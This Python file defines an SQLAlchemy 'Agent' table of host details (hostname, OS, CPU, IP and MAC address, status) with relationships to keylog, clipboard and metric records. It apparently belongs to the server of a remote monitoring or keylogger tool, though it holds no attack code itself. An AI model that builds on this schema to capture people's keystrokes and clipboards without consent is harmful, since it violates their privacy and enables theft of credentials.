from sqlalchemy import Column, String, Integer, DateTime, Boolean
from sqlalchemy.orm import relationship
from datetime import datetime
import uuid

from app.db.database import Base

class Agent(Base):
    __tablename__ = "agents"

    id = Column(String, primary_key=True, default=lambda: str(uuid.uuid4()))

    hostname = Column(String)
    os = Column(String)
    os_release = Column(String)
    os_version = Column(String)
    architecture = Column(String)
    processor = Column(String)

    physical_cores = Column(Integer)
    total_cores = Column(Integer)
    max_frequency = Column(String)

    ip_address = Column(String)
    mac_address = Column(String)

    status = Column(Boolean, default=True) # True = online, False = offline
    created_at = Column(DateTime, default=datetime.utcnow)
    last_seen = Column(DateTime, default=datetime.utcnow)

    # Relationships
    keylogs = relationship("Keylog", back_populates="agent", cascade="all, delete-orphan")
    metrics = relationship("Metric", back_populates="agent", cascade="all, delete-orphan")
    clipboards = relationship("Clipboard", back_populates="agent", cascade="all, delete-orphan")